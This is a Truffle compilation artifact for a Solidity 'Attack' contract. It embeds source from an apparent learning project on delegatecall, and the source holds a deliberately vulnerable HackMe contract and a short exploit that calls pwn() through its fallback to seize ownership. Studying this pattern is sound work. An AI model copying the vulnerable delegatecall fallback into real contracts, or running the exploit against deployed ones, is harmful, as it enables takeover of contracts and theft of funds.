{
  "contractName": "Attack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_hackMe",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "hackMe",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516103cf3803806103cf833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b6102b8806101176000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c806375efcec51461003b5780639e5faafc14610059575b600080fd5b610043610063565b60405161005091906101d6565b60405180910390f35b610061610087565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527fdd365b8b000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161014e919061026b565b6000604051808303816000865af19150503d806000811461018b576040519150601f19603f3d011682016040523d82523d6000602084013e610190565b606091505b505050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101c082610195565b9050919050565b6101d0816101b5565b82525050565b60006020820190506101eb60008301846101c7565b92915050565b600081519050919050565b600081905092915050565b60005b8381101561022557808201518184015260208101905061020a565b83811115610234576000848401525b50505050565b6000610245826101f1565b61024f81856101fc565b935061025f818560208601610207565b80840191505092915050565b6000610277828461023a565b91508190509291505056fea2646970667358221220faa343e3758a8fb44d4be3fc3c35dd73719789af5dbe266d80daf18c0429c67964736f6c634300080b0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.11;\n\ncontract Lib {\n    address public owner;\n\n    function pwn() public {\n        owner = msg.sender;\n    }\n}\n\ncontract HackMe {\n    address public owner;\n    Lib public lib;\n\n    constructor(Lib _lib) {\n        owner = msg.sender;\n        lib = Lib(_lib);\n    }\n\n    fallback() external payable {\n        address(lib).delegatecall(msg.data);\n    }\n}\n\ncontract Attack {\n    address public hackMe;\n\n    constructor(address _hackMe) {\n        hackMe = _hackMe;\n    }\n\n    function attack() public {\n        hackMe.call(abi.encodeWithSignature(\"pwn()\"));\n    }\n}\n",
  "sourcePath": "/home/shenjun/Desktop/tools/finance/truffle_test1/contracts/Delegatecall.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.11+commit.d7f03943.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2024-06-03T07:47:34.021Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}